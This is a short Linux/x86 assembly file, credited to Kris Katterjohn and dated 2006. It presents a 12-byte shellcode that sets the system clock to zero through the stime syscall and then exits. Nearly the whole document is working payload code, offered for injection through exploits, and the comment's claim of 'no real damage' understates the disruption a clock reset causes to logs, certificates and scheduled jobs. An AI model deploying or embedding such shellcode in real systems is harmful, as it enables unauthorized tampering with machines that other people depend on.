;By Kris Katterjohn 11/18/2006
;12 byte shellcode to set system time to 0 and exit. No real damage :)
;exit() code is the last 5 bytes (0x6a - 0x80) 
; for Linux/x86
 
 
 
  section .text
 
       global _start
 
  _start:
 
  ; stime([0])
 
       mov al,25
       cdq
       push edx
       mov ebx, esp
       int 0x80
 
  ; exit()
 
       inc al
       int 0x80
 
